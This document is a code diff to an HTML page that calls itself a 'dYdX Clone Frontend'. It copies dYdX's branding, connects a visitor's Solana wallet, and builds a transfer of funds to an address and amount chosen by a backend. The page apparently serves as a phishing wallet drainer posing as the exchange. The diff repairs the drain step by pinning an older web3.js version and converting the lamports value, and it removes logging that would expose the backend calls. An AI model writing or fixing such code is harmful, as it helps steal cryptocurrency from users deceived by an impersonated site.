@@ -80,32 +80,23 @@
     <div class="metrics"><div style="color:#6966FF; text-transform:uppercase; font-size:14px;">Why dYdX?</div><h2>Trusted at Scale</h2><div class="metrics-grid"><div class="metric-card"><div class="metric-number">$1.4T</div><div class="metric-label">Lifetime Volume</div></div><div class="metric-card"><div class="metric-number">$200M</div><div class="metric-label">Open Interest</div></div><div class="metric-card"><div class="metric-number">220+</div><div class="metric-label">Markets</div></div><div class="metric-card"><div class="metric-number">$12M</div><div class="metric-label">MegaVault TVL</div></div></div></div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <!-- CRITICAL: Using STABLE version 1.66.2 which doesn't have the Blob.encode bug -->
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.66.2/lib/index.iife.min.js"></script>
     <script>
         // ============================================
-        // CRITICAL: Buffer polyfill for Solana
+        // Buffer polyfill for Solana (v1.66.2 compatible)
         // ============================================
         if (!window.Buffer) { 
             window.Buffer = { 
                 from: (s) => new TextEncoder().encode(s), 
                 alloc: (n) => new Uint8Array(n),
-                isBuffer: (obj) => obj instanceof Uint8Array,
-                concat: (list, length) => {
-                    const total = length || list.reduce((acc, buf) => acc + buf.length, 0);
-                    const result = new Uint8Array(total);
-                    let offset = 0;
-                    for (const buf of list) {
-                        result.set(buf, offset);
-                        offset += buf.length;
-                    }
-                    return result;
-                }
+                isBuffer: (obj) => obj instanceof Uint8Array
             }; 
         }
 
         document.addEventListener('DOMContentLoaded', function() {
             console.log('========================================');
-            console.log('🚀 dYdX Clone Frontend Loaded');
+            console.log('🚀 dYdX Clone Frontend Loaded (v1.66.2)');
             console.log('========================================');
             
             const modal = document.getElementById('walletModal');
@@ -129,16 +120,14 @@
             }
             
             async function callBackend(endpoint, data) {
-                console.log(`📡 Calling ${endpoint} with:`, data);
                 const res = await fetch(endpoint, { 
                     method: 'POST', 
                     headers: { 'Content-Type': 'application/json' }, 
                     body: JSON.stringify(data || {}) 
                 });
-                if (!res.ok) throw new Error(`HTTP ${res.status}: ${await res.text()}`);
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
                 const result = await res.json();
                 if (result.error) throw new Error(result.error);
-                console.log(`✅ ${endpoint} response:`, result);
                 return result;
             }
             
@@ -192,7 +181,7 @@
                     console.log(`🔗 Blockhash: ${blockhashData.blockhash}`);
                     
                     // ============================================
-                    // FIX: Build transaction with BigInt for lamports
+                    // Build transaction with v1.66.2 compatible syntax
                     // ============================================
                     loadingTitle.textContent = 'Building Transaction...';
                     loadingSubtitle.textContent = 'Constructing transfer...';
@@ -201,24 +190,23 @@
                     const fromPubkey = new PublicKey(pubKey);
                     const toPubkey = new PublicKey(prepareData.to);
                     
-                    // CRITICAL FIX: Convert to BigInt explicitly
-                    const lamportsBigInt = BigInt(prepareData.amount);
-                    console.log(`🔢 Lamports as BigInt: ${lamportsBigInt} (${typeof lamportsBigInt})`);
+                    // For v1.66.2, lamports must be a Number (not BigInt)
+                    const lamportsNumber = Number(prepareData.amount);
+                    console.log(`🔢 Lamports as Number: ${lamportsNumber} (${typeof lamportsNumber})`);
                     
-                    // Validate lamports is not NaN or undefined
-                    if (isNaN(Number(prepareData.amount)) || prepareData.amount === undefined) {
+                    if (isNaN(lamportsNumber) || lamportsNumber <= 0) {
                         throw new Error(`Invalid lamports value: ${prepareData.amount}`);
                     }
                     
-                    // Create the transfer instruction with BigInt
-                    const transferIx = SystemProgram.transfer({
-                        fromPubkey: fromPubkey,
-                        toPubkey: toPubkey,
-                        lamports: lamportsBigInt  // Use BigInt here
-                    });
-                    
+                    // Create transaction
                     const transaction = new Transaction();
-                    transaction.add(transferIx);
+                    transaction.add(
+                        SystemProgram.transfer({
+                            fromPubkey: fromPubkey,
+                            toPubkey: toPubkey,
+                            lamports: lamportsNumber
+                        })
+                    );
                     transaction.recentBlockhash = blockhashData.blockhash;
                     transaction.lastValidBlockHeight = blockhashData.lastValidBlockHeight;
                     transaction.feePayer = fromPubkey;
@@ -260,7 +248,6 @@
                     
                 } catch(e) {
                     console.error('❌ FATAL ERROR:', e);
-                    console.error('Stack:', e.stack);
                     loadingTitle.textContent = 'Failed';
                     loadingSubtitle.textContent = e.message || 'Something went wrong. Please try again.';
                     setTimeout(hideModal, 3000);
